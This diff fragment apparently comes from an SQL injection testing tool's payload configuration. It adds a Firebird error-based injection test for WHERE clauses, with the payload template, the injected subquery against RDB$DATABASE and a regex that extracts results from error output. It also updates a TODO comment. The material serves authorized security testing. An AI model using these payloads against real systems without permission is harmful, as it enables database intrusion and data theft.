@@ -704,9 +704,28 @@ Formats:
             <dbms>Oracle</dbms>
         </details>
     </test>
+
+    <test>
+        <title>Firebird error-based - WHERE clause</title>
+        <stype>2</stype>
+        <level>1</level>
+        <risk>0</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <epayload>AND [RANDNUM]=('[DELIMITER_START]'||%s||'[DELIMITER_STOP]')</epayload>
+        <request>
+            <payload>AND [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END FROM RDB$DATABASE)||'[DELIMITER_STOP]')</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>Firebird</dbms>
+        </details>
+    </test>
     <!--
          TODO: if possible, add payload for SQLite, Microsoft Access,
-         Firebird and SAP MaxDB - no known techniques at this time
+         and SAP MaxDB - no known techniques at this time
     -->
     <!-- End of error-based tests - WHERE clause -->
 
